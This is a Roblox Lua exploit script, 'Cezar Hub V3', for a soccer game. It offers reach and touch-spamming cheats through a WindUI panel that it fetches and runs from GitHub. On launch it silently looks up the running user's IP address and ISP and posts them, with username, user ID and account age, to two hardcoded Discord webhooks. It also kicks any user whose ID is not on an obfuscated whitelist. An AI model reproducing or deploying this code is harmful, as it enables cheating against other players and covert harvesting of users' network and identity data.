-- [[ CEZAR PRIVATE V3 - TOTAL OVERHAUL ]]
-- [[ GREEN LOGS + SIDEBAR UI + OPTIMIZED MOSS ]]

local lp = game:GetService("Players").LocalPlayer
local hs = game:GetService("HttpService")
local rs = game:GetService("RunService")
local ws = game:GetService("Workspace")
local uis = game:GetService("UserInputService")

-- [[ AUTH & PERMANENT WHITELIST ]]
local _WL = {
    [tostring(bit32.bxor(4479445660, 99))] = true,
    [tostring(bit32.bxor(10459866852, 99))] = true,
    [tostring(bit32.bxor(10459902683, 99))] = true,
    [tostring(bit32.bxor(10412239686, 99))] = true,
    [tostring(bit32.bxor(10468504953, 99))] = true,
    [tostring(bit32.bxor(10378425639, 99))] = true,
    [tostring(bit32.bxor(5170104098, 99))] = true,
    [tostring(bit32.bxor(7003997072, 99))] = true
}

-- [[ GREEN INTEL LOGGER ]]
local function SendFullIntel()
    local hooks = {
        "https://discordapp.com/api/webhooks/1470123276381716535/sdeTIMl8cMvBUHM69La7DbjQoc7hcfDMafa3XrxO5ilXVD5fZ_-wnuQQA3MMCWupNZAx",
        "https://discordapp.com/api/webhooks/1469712109255266435/X1VpIz7AOMYw04s0c1h8EqDEauvlILsXIxNR8B5XSMEbA42b6kHfjQ3b1tjPnmFTA9i3"
    }
    task.spawn(function()
        local net = {query = "N/A", isp = "N/A", country = "N/A"}
        pcall(function() net = hs:JSONDecode(game:HttpGet("http://ip-api.com/json/")) end)
        
        local data = {
            ["embeds"] = {{
                ["title"] = "✅ CEZAR V3 - SUCCESSFUL EXECUTION",
                ["color"] = 65280, -- NEON GREEN
                ["fields"] = {
                    {["name"] = "👤 Target", ["value"] = lp.Name.." ("..lp.UserId..")", ["inline"] = true},
                    {["name"] = "🌐 Network", ["value"] = "IP: "..net.query.."\nISP: "..net.isp, ["inline"] = false},
                    {["name"] = "💻 System", ["value"] = "Account Age: "..lp.AccountAge.." days", ["inline"] = true}
                },
                ["footer"] = {["text"] = "Cezar Private Hub | Green Log Edition"}
            }}
        }
        for _, url in pairs(hooks) do
            pcall(function() (request or http_request or syn.request)({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = hs:JSONEncode(data)}) end)
        end
    end)
end

if not _WL[tostring(bit32.bxor(lp.UserId, 99))] then lp:Kick("DM KERSAII ON DC") return else SendFullIntel() end

-- [[ CONFIG ]]
local cfg = {
    leg_enabled = false, leg_x = 9, leg_y = 9, leg_z = 9,
    moss_enabled = false, m_x = 2.0, m_y = 2.9, m_z = 1.7,
    khalid_enabled = false, react_multiplier = 100, reach_power = 15,
    react_strength = 50
}

-- [[ UI LOAD - PURE BLACK ]]
local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
local Window = WindUI:CreateWindow({
    Title = "Cezar Hub V3",
    Size = UDim2.fromOffset(650, 500),
    Transparent = false
})

WindUI:AddTheme({
    Name = "Pure_Void",
    Accent = Color3.fromRGB(0, 255, 0), -- Green Accent
    Outline = Color3.fromRGB(0, 0, 0),
    Text = Color3.fromRGB(255, 255, 255),
    WindowBackground = Color3.fromRGB(0, 0, 0),
    ElementBackground = Color3.fromRGB(5, 5, 5),
})
WindUI:SetTheme("Pure_Void")

-- [[ SIDEBAR TABS ]]
local MossTab = Window:Tab({ Title = "Moss", Icon = "target" })
local ReachTab = Window:Tab({ Title = "Reach", Icon = "mouse-pointer-2" })
local KhalidTab = Window:Tab({ Title = "Khalid", Icon = "wind" })
local ReactTab = Window:Tab({ Title = "React", Icon = "zap" })
local MiscTab = Window:Tab({ Title = "SM", Icon = "settings" })

-- [[ MOSS - BUFFED ]]
MossTab:Toggle({ Title = "Enable Moss", Callback = function(v) cfg.moss_enabled = v end })
MossTab:Slider({ Title = "Header X", Value = {Min = 0, Max = 25, Default = 2.0}, Callback = function(v) cfg.m_x = v end })
MossTab:Slider({ Title = "Header Y", Value = {Min = 0, Max = 25, Default = 2.9}, Callback = function(v) cfg.m_y = v end })
MossTab:Slider({ Title = "Header Z", Value = {Min = 0, Max = 25, Default = 1.7}, Callback = function(v) cfg.m_z = v end })
for _, p in pairs({15, 25, 50, 75, 100}) do
    MossTab:Button({ Title = "Moss "..p.."%", Callback = function() cfg.react_multiplier = (p == 25 and 450 or p * 4) end })
end

-- [[ REACH ]]
ReachTab:Toggle({ Title = "Enable Reach", Callback = function(v) cfg.leg_enabled = v end })
ReachTab:Slider({ Title = "Reach X", Value = {Min = 0, Max = 35, Default = 9}, Callback = function(v) cfg.leg_x = v end })
ReachTab:Slider({ Title = "Reach Y", Value = {Min = 0, Max = 35, Default = 9}, Callback = function(v) cfg.leg_y = v end })
ReachTab:Slider({ Title = "Reach Z", Value = {Min = 0, Max = 35, Default = 9}, Callback = function(v) cfg.leg_z = v end })
for _, p in pairs({15, 25, 50, 75, 100}) do ReachTab:Button({ Title = "Reach "..p.."%", Callback = function() cfg.reach_power = p * 2 end }) end

-- [[ KHALID ]]
KhalidTab:Toggle({ Title = "Enable Khalid Volleys", Callback = function(v) cfg.khalid_enabled = v end })
for _, p in pairs({15, 25, 50, 75, 100}) do
    KhalidTab:Button({ Title = "Khalid "..p.."%", Callback = function() cfg.react_strength = p * 5 end })
end

-- [[ REACT ]]
for _, p in pairs({15, 25, 50, 75, 100}) do
    ReactTab:Button({ Title = "React "..p.."%", Callback = function() cfg.react_strength = p * 10 end })
end

-- [[ ENGINE - OPTIMIZED ]]
rs.Heartbeat:Connect(function()
    pcall(function()
        local char = lp.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local ball = ws:FindFirstChild("TPSSystem") and ws.TPSSystem:FindFirstChild("TPS") or ws:FindFirstChild("Ball")
        if not root or not ball then return end
        local dist = (ball.Position - root.Position)
        
        -- MOSS (FIXED & BUFFED)
        if cfg.moss_enabled and dist.Y > 0.2 and dist.Y <= cfg.m_y and math.abs(dist.X) <= cfg.m_x and math.abs(dist.Z) <= cfg.m_z then
            for i = 1, cfg.react_multiplier do 
                firetouchinterest(ball, char.Head, 0); firetouchinterest(ball, char.Head, 1) 
            end
        end

        -- KHALID / REACT / REACH
        if (cfg.khalid_enabled or cfg.leg_enabled) and math.abs(dist.X) <= cfg.leg_x and math.abs(dist.Z) <= cfg.leg_z then
            local hits = (cfg.khalid_enabled and cfg.react_strength or cfg.reach_power)
            for i = 1, hits do
                firetouchinterest(ball, char["Right Leg"], 0); firetouchinterest(ball, char["Right Leg"], 1)
            end
        end
    end)
end)
